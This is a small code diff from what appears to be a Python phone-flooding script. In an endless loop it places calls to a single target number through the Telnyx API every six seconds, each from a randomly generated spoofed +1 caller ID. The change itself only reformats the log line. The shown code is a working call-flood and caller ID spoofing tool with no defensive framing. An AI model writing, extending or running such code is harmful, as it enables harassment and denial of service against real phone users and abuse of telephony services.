@@ -26,7 +26,7 @@ while True:
     flood_amount += 1
     area_code = random.choice(area_codes)
     caller_id = random.randrange(3000000, 9000000)
-    print(f"FLOOD: {flood_amount} CALLING: {number} FROM: {area_code}{caller_id}")
+    print(f"FLOOD: {flood_amount} CALLING: {number} FROM: +1{area_code}{caller_id}")
     telnyx.Call.create(connection_id=control_id, to=number, from_=f"+1{area_code}{caller_id}")
     time.sleep(6)
 
